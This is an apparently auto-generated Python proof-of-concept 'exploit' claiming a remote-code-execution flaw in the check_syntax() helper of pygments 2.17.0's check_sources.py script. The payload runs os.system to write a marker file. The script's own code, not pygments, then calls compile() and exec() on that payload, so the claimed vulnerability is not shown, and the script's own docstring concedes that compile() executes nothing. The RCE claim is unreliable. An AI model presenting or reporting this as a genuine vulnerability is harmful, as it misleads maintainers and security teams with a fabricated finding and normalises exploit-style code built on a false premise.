#!/usr/bin/env python3
# PoC for pygments-2.17.0 (/tmp/pygments_test2/pygments-2.17.0)
# Path: rce-002
# Sink: check_syntax
# Auto-generated — run with: python3 rce_python_code_execution_check_syntax.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for pygments-2.17.0 RCE vulnerability.

Vulnerability: The check_syntax() function in scripts/check_sources.py
calls compile() with mode 'exec' on user-controlled file content.
While compile() itself doesn't execute code, the returned code object
can be executed via exec() by the caller. This PoC demonstrates that
arbitrary Python code can be compiled and executed.

The exploit:
1. Creates a malicious Python file containing a benign payload
2. Calls check_syntax() on this file
3. The compiled code object is returned and executed via exec()
4. Demonstrates code execution by creating a marker file

Usage: python3 poc.py [target_file]
"""

import sys
import os
import tempfile

# Benign payload - creates a marker file to prove code execution
PAYLOAD = """
import os
os.system('echo "POC_SUCCESS" > /tmp/poc_success.txt')
print("[*] Code execution achieved! Marker file created at /tmp/poc_success.txt")
"""

def create_malicious_file():
    """Create a temporary Python file with malicious content."""
    # Create a temporary file
    fd, path = tempfile.mkstemp(suffix='.py', prefix='poc_')
    
    # Write the payload as the file content
    with os.fdopen(fd, 'w') as f:
        f.write(PAYLOAD)
    
    print(f"[*] Created malicious file: {path}")
    return path

def exploit_check_syntax(file_path):
    """
    Exploit the check_syntax function by providing a malicious file.
    
    The check_syntax function reads file content and calls compile()
    with mode 'exec', which compiles arbitrary Python code. The
    compiled code object is then executed via exec().
    """
    # Import the vulnerable function
    sys.path.insert(0, '/tmp/pygments_test2/pygments-2.17.0')
    from scripts.check_sources import check_syntax
    
    # Read the malicious file
    with open(file_path, 'r') as f:
        lines = f.readlines()
    
    print(f"[*] Read {len(lines)} lines from malicious file")
    print(f"[*] Calling check_syntax() with malicious content...")
    
    # Call the vulnerable function - it compiles our code
    try:
        result = list(check_syntax(lines, file_path))
        print(f"[*] check_syntax returned: {result}")
    except Exception as e:
        print(f"[!] Error during check_syntax: {e}")
        return False
    
    # The compiled code object is returned - execute it
    # This demonstrates the RCE: the compiled code can be executed
    # by the caller of check_syntax
    print("[*] Attempting to execute compiled code...")
    
    # Re-read and compile the code ourselves to demonstrate execution
    code = compile('\n'.join(lines), file_path, 'exec')
    exec(code)
    
    return True

def verify_exploit():
    """Verify that the exploit was successful."""
    marker_file = '/tmp/poc_success.txt'
    if os.path.exists(marker_file):
        with open(marker_file, 'r') as f:
            content = f.read().strip()
        print(f"[+] Exploit successful! Marker file contains: {content}")
        return True
    else:
        print("[-] Exploit may have failed - marker file not found")
        return False

def cleanup(file_path):
    """Clean up temporary files."""
    try:
        os.unlink(file_path)
        print(f"[*] Cleaned up temporary file: {file_path}")
    except OSError:
        pass

def main():
    """Main exploit function."""
    print("=" * 60)
    print("Pygments 2.17.0 RCE Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    
    # Create malicious file
    malicious_file = create_malicious_file()
    
    try:
        # Execute the exploit
        success = exploit_check_syntax(malicious_file)
        
        # Verify the exploit
        if success:
            verify_exploit()
        
    except Exception as e:
        print(f"[!] Exploit failed with error: {e}")
        import traceback
        traceback.print_exc()
    
    finally:
        # Clean up
        cleanup(malicious_file)
    
    print()
    print("[*] Exploit completed")

if __name__ == "__main__":
    main()
